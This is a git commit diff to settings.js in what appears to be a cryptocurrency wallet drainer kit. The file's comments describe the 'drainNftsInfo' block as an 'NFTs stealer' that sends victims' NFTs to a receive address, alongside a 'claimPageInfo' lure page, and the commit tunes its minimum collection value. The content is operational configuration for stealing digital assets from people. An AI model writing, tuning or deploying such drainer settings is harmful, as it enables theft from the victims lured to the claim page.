2c08167da751dc07079890ff8f06a86d56c342c8
dzverev2604 <105285746+dzverev2604@users.noreply.github.com>
2022-07-09 00:05:45 +0300

    Update settings.js

--- settings.js
+++ settings.js
@@ -28,7 +28,7 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.0000000000001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.00000001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: // leave empty if you want to use the same as receiveAddress 
 }
 
